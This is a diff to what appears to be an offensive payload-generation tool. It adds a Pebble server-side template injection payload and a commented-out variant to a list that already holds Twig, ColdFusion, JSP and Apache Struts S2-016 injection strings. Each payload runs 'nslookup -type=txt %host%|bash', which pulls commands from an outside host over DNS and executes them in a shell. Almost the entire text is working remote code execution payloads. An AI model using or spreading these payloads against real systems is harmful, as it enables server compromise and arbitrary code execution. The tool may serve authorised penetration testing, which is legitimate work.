@@ -118,6 +118,10 @@ class loader:
                 ["{{`nslookup -type=txt %host%|bash`}}",sh_conbacks],#PHP Twig/Misc. server-side template injection
                 ['<cfexecute name="/bin/bash" arguments="-c \'nslookup -type=txt %host%|bash\'" timeout="1" />'],#cold fusion - untested.
                 #["<%@page import="java.lang.*"%><%Runtime.getRuntime().exec(\"cmd /c nslookup -type=txt %host%|cmd\");%>",sh_conbacks],#JSP template injection windows
+                #this should work, but 'name' must be defined:
+                #['{{name.getClass().forName("java.lang.Runtime").getRuntime().exec(new String[]{"bash","-c","nslookup -type=txt %host%|bash"})}}',
+                #Pebble template injection 
+                ['{{(1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(new String[]{"bash","-c","nslookup -type=txt %host%|bash"})}}'],
                 ['<%@ page import="java.util.*,java.io.*"%><%Runtime.getRuntime().exec(new String[]{"bash","-c","nslookup -type=txt %host%|bash"});%>',sh_conbacks],#JSP template Injection *nix
                 # java struts code exec vuln, these are url params like http://f.com/a/?redirect:blahblahblah see https://struts.apache.org/docs/s2-016.html
                 # this one is for debugging, had some issues with url encoding, this payload will output the results in HTTP response ['''redirect:%25{%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash','-c','nslookup+-type%3dtxt+%host%|bash'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}})).start()}''', sh_conbacks],
